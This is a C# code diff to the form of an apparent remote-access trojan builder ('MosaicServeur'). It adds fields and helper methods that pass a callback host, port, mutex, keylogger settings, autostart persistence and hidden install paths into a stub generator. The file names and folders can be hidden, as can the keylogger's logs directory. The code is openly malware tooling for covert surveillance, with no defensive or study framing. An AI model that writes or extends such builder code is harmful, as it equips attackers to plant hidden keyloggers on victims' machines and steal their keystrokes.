@@ -14,6 +14,7 @@ namespace MosaicServeur
         private FrmBuilderController buildercontroller = new FrmBuilderController();
         private int PORT = 0;
         private int RECONNECT = 0;
+        private int installPATH;
 
 
         public Builder()
@@ -31,14 +32,19 @@ namespace MosaicServeur
             lblLogDir.Foreground = new SolidColorBrush(Colors.LightGray);
             txtLogDir.IsEnabled = false;
             chkKeyLogger.IsChecked = false;
-            chkDirHidden.IsEnabled = false;
+            chkHideLogsDir.IsEnabled = false;
             chkAutoStart.IsChecked = false;
             txtStartupName.IsEnabled = false;
             txtStartupName.Text = "";
+            txtSubDirI.Text = "";
+            txtFileNameI.Text = "";
             radioGroup.IsEnabled = false;
             spSubDirectory.IsEnabled = false;
             spFileName.IsEnabled = false;
             chkInstall.IsChecked = false;
+            rdbAppData.IsChecked = true;
+            chkHideSubDirI.IsChecked = false;
+            chkHideFileI.IsChecked = false;
             lblDirectory.Foreground = new SolidColorBrush(Colors.LightGray);
             lblSubDirectory.Foreground = new SolidColorBrush(Colors.LightGray);
             lblFileName.Foreground = new SolidColorBrush(Colors.LightGray);
@@ -68,8 +74,38 @@ namespace MosaicServeur
 
         private void btnBuild(object sender, RoutedEventArgs e)
         {
-            buildercontroller.create_stub(txtHost.Text, txtPort.Text, txtMutex.Text, txtRecoTries.Text, txtClientID.Text, // Connexion Settings
-                (chkKeyLogger.IsChecked).ToString(), txtLogDir.Text, (chkAutoStart.IsChecked).ToString(), txtStartupName.Text); // Standard Settings
+            buildercontroller.create_stub(txtHost.Text, txtPort.Text, txtMutex.Text, txtRecoTries.Text, txtClientID.Text,
+                txtLogDir.Text, txtStartupName.Text, txtSubDirI.Text, txtFileNameI.Text, getInstallPath(), getChkValues()); 
+        }
+
+        private string getInstallPath()
+        {
+            string i = "";
+            if(radio1.IsChecked == true)
+                i = "1";
+            else if(radio2.IsChecked == true)
+                i = "2";
+            else if(radio3.IsChecked == true)
+                i = "3";
+            return i;
+        }   
+
+        private string getTxtInstall()
+        {
+            string txtInstaller = "";
+            txtInstaller += txtSubDirI.Text +'&';
+            return txtInstaller;
+        }
+
+        private string getChkValues()
+        {
+            string trueOrFalse = "";
+            trueOrFalse += chkKeyLogger.IsChecked   == true ? "1" : "0";
+            trueOrFalse += chkAutoStart.IsChecked   == true ? "1" : "0";
+            trueOrFalse += chkHideSubDirI.IsChecked == true ? "1" : "0";
+            trueOrFalse += chkHideFileI.IsChecked   == true ? "1" : "0";
+            trueOrFalse += chkHideLogsDir.IsChecked == true ? "1" : "0";
+            return trueOrFalse;
         }
 
         private void btnMutex(object sender, RoutedEventArgs e)
@@ -82,14 +118,14 @@ namespace MosaicServeur
             if (chkKeyLogger.IsChecked.Value == true)
             {
                 txtLogDir.IsEnabled = true;
-                chkDirHidden.IsEnabled = true;
+                chkHideLogsDir.IsEnabled = true;
                 lblLogDir.Foreground = new SolidColorBrush(Colors.Black);
             }
             else
             {
                 txtLogDir.IsEnabled = false;
-                chkDirHidden.IsEnabled = false;
-                chkDirHidden.IsChecked = false;
+                chkHideLogsDir.IsEnabled = false;
+                chkHideLogsDir.IsChecked = false;
                 lblLogDir.Foreground = new SolidColorBrush(Colors.LightGray);
             }
         }
@@ -99,10 +135,12 @@ namespace MosaicServeur
             if (chkAutoStart.IsChecked.Value == true)
             {
                 txtStartupName.IsEnabled = true;
+                lblStartupName.Foreground = new SolidColorBrush(Colors.Black);
             }
             else
             {
                 txtStartupName.IsEnabled = false;
+                lblStartupName.Foreground = new SolidColorBrush(Colors.LightGray);
             }
         }
 
@@ -113,7 +151,6 @@ namespace MosaicServeur
                 radioGroup.IsEnabled = true;
                 spSubDirectory.IsEnabled = true;
                 spFileName.IsEnabled = true;
-
                 lblDirectory.Foreground = new SolidColorBrush(Colors.Black);
                 lblSubDirectory.Foreground = new SolidColorBrush(Colors.Black);
                 lblFileName.Foreground = new SolidColorBrush(Colors.Black);
